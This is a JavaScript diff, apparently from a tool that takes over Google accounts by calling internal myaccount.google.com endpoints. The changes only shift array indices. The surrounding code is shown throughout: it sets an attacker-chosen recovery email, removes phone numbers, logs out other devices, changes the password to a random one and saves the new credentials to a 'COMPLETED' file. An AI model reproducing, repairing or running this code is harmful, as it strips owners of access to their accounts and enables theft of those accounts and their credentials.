@@ -356,11 +356,11 @@ function languageChange(connection, mData) {
             let position = Math.floor((Math.random() * (mRecovery.length-1)))
             let recovery = mRecovery[position]
             
-            mData[7] = mGmail
-            mData[8] = recovery
-            mData[9] = numbers
-            mData[10] = time
-            mData[11] = year
+            mData[8] = mGmail
+            mData[9] = recovery
+            mData[10] = numbers
+            mData[11] = time
+            mData[12] = year
 
             axios.post('https://myaccount.google.com/_/language_update', getLanguage(time), {
                 maxRedirects: 0,
@@ -380,7 +380,7 @@ function languageChange(connection, mData) {
 }
 
 function recoveryChange(connection, mData) {
-    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[7], getRecoveryData(mData[8]+'@gmail.com', mData[10]), {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[7], getRecoveryData(mData[9]+'@gmail.com', mData[11]), {
         maxRedirects: 0,
         validateStatus: null,
         headers: getHeader(mData[6])
@@ -389,7 +389,7 @@ function recoveryChange(connection, mData) {
         try {
             if(!response.data.includes('"er"')) {
                 wrong = false
-                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[10]), {
+                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[11]), {
                     maxRedirects: 0,
                     validateStatus: null,
                     headers: getHeader(mData[6])
@@ -449,9 +449,9 @@ function deviceLogOut(connection, mData) {
             }
 
             if (time == null) {
-                time = mData[10]
+                time = mData[11]
             } else {
-                mData[10] = time
+                mData[11] = time
             }
 
             if(Object.keys(logout).length > 0) {
@@ -501,14 +501,14 @@ function deviceLogOut(connection, mData) {
 function numberRemove(connection, mData) {
     let size = 0
     let output = 0
-    let numbers = mData[9]
+    let numbers = mData[10]
 
     if (numbers.length == 0) {
         passwordChange(connection, mData)
     } else {
         for(let i=0; i<numbers.length; i++) {
             size++
-            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[7], getPhoneData(numbers[i], mData[10]), {
+            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[7], getPhoneData(numbers[i], mData[11]), {
                 maxRedirects: 0,
                 validateStatus: null,
                 headers: getHeader(mData[6])
@@ -531,7 +531,7 @@ function numberRemove(connection, mData) {
 function passwordChange(connection, mData) {
     let changePass = getRandomPassword()
 
-    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[7], getChangePasswordData(changePass, mData[10]), {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[7], getChangePasswordData(changePass, mData[11]), {
         maxRedirects: 0,
         validateStatus: null,
         headers: getHeader(mData[6])
@@ -541,10 +541,10 @@ function passwordChange(connection, mData) {
                 changePass = mData[2]
             }
 
-            let send = { create: mData[11], password: changePass, recovery: mData[8] }
-            console.log(send)
+            let send = { create: mData[12], password: changePass, recovery: mData[9] }
+            console.log(mData[8], send)
 
-            setData(COMPLETED+mData[0]+'/'+mData[7]+'.json', send)
+            setData(COMPLETED+mData[0]+'/'+mData[8]+'.json', send)
 
             if (connection) {
                 connection.end('SUCCESS')
@@ -555,10 +555,10 @@ function passwordChange(connection, mData) {
         try {
             changePass = mData[2]
 
-            let send = { create: mData[11], password: changePass, recovery: mData[8] }
+            let send = { create: mData[12], password: changePass, recovery: mData[9] }
             console.log(send)
             
-            setData(COMPLETED+mData[0]+'/'+mData[7]+'.json', send)
+            setData(COMPLETED+mData[0]+'/'+mData[8]+'.json', send)
 
             if (connection) {
                 connection.end('SUCCESS')
